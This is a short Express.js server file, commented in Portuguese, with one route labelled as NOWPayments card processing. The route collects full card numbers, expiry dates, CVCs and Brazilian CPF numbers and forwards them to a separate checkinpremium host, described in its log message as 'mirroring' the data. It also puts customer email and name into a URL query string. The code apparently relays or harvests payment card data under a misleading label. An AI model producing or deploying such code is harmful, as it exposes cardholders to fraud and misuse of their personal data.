import express from 'express';
import axios from 'axios';

const app = express();

app.use(express.json());

app.post('/process-nowpayments-card', async (req, res) => {
  const { name, email, cpf, number, expiry, cvc } = req.body;

  try {
    // 1. O seu servidor envia automaticamente os dados para o checkinpremium
    // IMPORTANTE: Ajuste os campos e a URL para a API real do checkinpremium se necessário
    const respostaCheckin = await axios.post('https://api.checkinpremium.com/v1/checkout', {
      customer_name: name,
      customer_email: email,
      customer_document: cpf,
      card_number: number,
      card_expiration: expiry,
      card_cvv: cvc,
      amount: 30.00 
    }, {
      headers: {
        'Authorization': 'Bearer SEU_TOKEN_AQUI', // Se houver token, coloque aqui
        'Content-Type': 'application/json'
      }
    });

    // 2. Se a API deles retornar a URL de destino:
    if (respostaCheckin.data && respostaCheckin.data.url) {
      return res.status(200).json({
        redirectUrl: respostaCheckin.data.url 
      });
    } else {
      // Fallback caso queira apenas injetar os dados via query params na URL padrão
      const urlComDados = `https://checkinpremium.com/checkout?email=${encodeURIComponent(email)}&nome=${encodeURIComponent(name)}`;
      return res.status(200).json({ redirectUrl: urlComDados });
    }

  } catch (error) {
    console.error("Erro ao espelhar dados:", error.message);
    return res.status(500).json({ message: "Erro ao sincronizar com o gateway de pagamento." });
  }
});

// Inicialização na porta do Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando com ES Modules na porta ${PORT}`));